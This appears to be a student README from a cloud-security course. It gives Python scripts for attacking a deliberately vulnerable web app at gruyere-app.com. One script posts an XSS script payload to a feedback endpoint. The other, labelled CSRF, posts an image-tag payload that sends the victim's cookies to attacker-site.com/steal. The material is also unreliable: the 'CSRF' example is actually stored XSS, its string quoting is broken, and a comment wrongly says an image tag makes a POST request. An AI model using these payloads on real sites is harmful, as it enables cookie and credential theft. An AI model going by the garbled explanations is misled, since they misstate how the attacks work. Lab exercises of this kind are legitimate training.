# Cloud-Security-2023
Create code that can automatically exploit its documented vulnerabilities.

**Cross-Site Scripting(XSS attack)**-harmful because they can be used to steal sensitive information, like login credentials or personal data from users.
How to execute an XSS attack- the payload variable contains a script tag with malicious JavaScript code. Problem arises if the server doesn't correctly/properly sanitize or encode the feedback parameter when rendering it in an HTML response. Consequence- script modified on the client side (XSS attack)

**Python Code for Cross-Site Scripting**

import requests  
payload = "<script>alert('XSS Attack!');</script>" #Payload variable mentioned above- site of vulnerability 
document_id = "your-document-id"
url = f"http://gruyere-app.com/feedback?id={document_id}" #This is the target website whereby the document ID has been appended to reach specific endpoint
data = {"feedback": payload}  #key-value pair received by the server where the data is processed(ie value which the payload variable is processed)
response = requests.post(url, data=data)
print(response.text)

**Cross Site Request Forgery (CSRF)**-tricks you into performing actions (unknowingly) on a website you trust, using your already authenticated session. It achieves this using login cookies and after authentication, carries out the request made. This request is a CSRF attack and can be mitigated using anti-CSRF tokens.

**Python Code for Cross-Site Request Forgery**

import requests  
payload = '<img src="http://attacker-site.com/steal?cookie=" + document.cookie + \'">\';' #Assigning a payload variable which contains malicious content in the form of html image tag sourced from the url shown.'document.cookie' is important as it stores the cookies associated with the web page (the attacker wants to make a request to). The html image tag tricks the web browser into making a POST request to the target website's settings endpoint.
url = "http://gruyere-app.com/settings" #Target URL
data = {"description": payload} #Key value pair 
response = requests.post(url, data=data) # Requests is a library in python used to make HTTP requests. Post request is made to the target URL and the dictionary 'data' is processed (which contains malicious request/content) which gives attacker access
print(response.text)
